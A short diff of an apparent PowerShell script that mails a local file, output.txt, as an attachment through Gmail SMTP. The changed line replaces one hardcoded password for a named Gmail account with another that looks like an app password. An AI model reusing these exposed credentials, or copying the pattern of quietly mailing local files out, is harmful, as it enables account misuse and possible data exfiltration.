@@ -106,7 +106,7 @@ $SMTPServer = "smtp.gmail.com"
 
 $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
 $SMTPClient.EnableSsl = $true
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("herbertswindel@gmail.com", "HerbertdePervert69")
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("herbertswindel@gmail.com", "isqn febe cwja vatn")
 
 # Send the email with attachment
 $Attachment = "$dir\output.txt"
